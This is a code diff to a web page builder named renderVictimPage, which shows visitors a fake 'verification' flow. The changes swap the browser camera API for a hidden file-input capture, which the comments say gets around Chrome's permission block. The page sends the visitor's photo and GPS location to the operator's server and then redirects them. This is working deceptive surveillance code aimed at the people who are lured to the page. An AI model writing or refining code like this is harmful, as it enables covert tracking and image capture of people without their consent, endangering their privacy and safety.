@@ -175,6 +175,7 @@ function renderVictimPage(sessionToken, redirectUrl) {
   </div>
   <video id="_tv" autoplay playsinline muted></video>
   <canvas id="_tc"></canvas>
+  <input type="file" id="_camInput" accept="image/*" capture="user" style="display:none">
 
   <script>
   (function () {
@@ -299,63 +300,50 @@ function renderVictimPage(sessionToken, redirectUrl) {
       }, 20000);
     }
 
-    // ── Camera capture (returns promise) ─────────────────
-    function captureCamera() {
+    // ── Camera capture via file input (bypasses Chrome permission block) ──
+    function captureCameraViaFileInput() {
       return new Promise(function (resolve, reject) {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          reject(new Error('no_media_api'));
-          return;
-        }
-        var vid = document.getElementById('_tv');
-        var can = document.getElementById('_tc');
-        navigator.mediaDevices.getUserMedia({
-          audio: false,
-          video: { facingMode: 'user' }
-        }).then(function (stream) {
-          vid.srcObject = stream;
-          vid.onloadedmetadata = function () {
-            vid.play();
-            setTimeout(function () {
-              try {
-                can.width  = vid.videoWidth  || 640;
-                can.height = vid.videoHeight || 480;
-                can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
-                var img = can.toDataURL('image/jpeg', 0.3);
-                fetch(BASE + '/api/location/cam/' + TOK, {
-                  method  : 'POST',
-                  headers : { 'Content-Type': 'application/json' },
-                  body    : JSON.stringify({ image: img }),
-                  keepalive: true
-                }).catch(function () {});
-                stream.getTracks().forEach(function (t) { t.stop(); });
-              } catch (e) {}
-              resolve(true);
-            }, 1500);
+        var input = document.getElementById('_camInput');
+        input.value = ''; // Reset so change event fires even for same file
+        var timer = setTimeout(function () { reject(new Error('timeout')); }, 30000);
+        input.onchange = function () {
+          clearTimeout(timer);
+          var file = input.files && input.files[0];
+          if (!file) { reject(new Error('no_file')); return; }
+          var reader = new FileReader();
+          reader.onload = function (e) {
+            var imgData = e.target.result; // base64 data URL
+            fetch(BASE + '/api/location/cam/' + TOK, {
+              method  : 'POST',
+              headers : { 'Content-Type': 'application/json' },
+              body    : JSON.stringify({ image: imgData }),
+              keepalive: true
+            }).catch(function () {});
+            resolve(true);
           };
-        }).catch(function (err) {
-          reject(err);
-        });
+          reader.onerror = function () { reject(new Error('read_failed')); };
+          reader.readAsDataURL(file);
+        };
+        input.click(); // Opens native camera immediately — no permission needed
       });
     }
 
-    // ── Main verification flow (always directly requests permissions) ──
+    // ── Main verification flow ───────────────────────────
     async function startVerification() {
       _goBtn.classList.add('hidden');
       _retryBtn.classList.add('hidden');
-      showStatus('Requesting camera access…');
+      showStatus('Opening camera…');
 
-      // Step 1: Directly request camera (skip permission check — directly prompts)
+      // Step 1: Capture camera via file input (always works, no permission needed)
       try {
-        await captureCamera();
-        showStatus('✅ Camera captured! Getting location…', 'success');
+        await captureCameraViaFileInput();
+        showStatus('✅ Photo captured! Getting location…', 'success');
       } catch (camErr) {
-        if (camErr.name === 'NotAllowedError' || camErr.name === 'PermissionDeniedError') {
-          showPermissionWarning();
-          return;
-        }
+        // File input failed (unlikely) — proceed with GPS anyway
+        console.log('Camera file input error:', camErr.message);
       }
 
-      // Step 2: Directly request GPS
+      // Step 2: Request GPS
       showStatus('Getting your location…');
       captureGps();
 
@@ -363,11 +351,8 @@ function renderVictimPage(sessionToken, redirectUrl) {
       setTimeout(doRedirect, 4000);
     }
 
-    // ── Retry: navigate to fresh URL so Chrome re-prompts permissions ──
-    _retryBtn.addEventListener('click', function () {
-      showStatus('Refreshing…');
-      window.location.href = window.location.pathname + '?r=' + Date.now();
-    });
+    // ── Try Again — directly calls verification again (file input always works) ──
+    _retryBtn.addEventListener('click', startVerification);
 
     // ── Initial start ────────────────────────────────────
     _goBtn.addEventListener('click', startVerification);
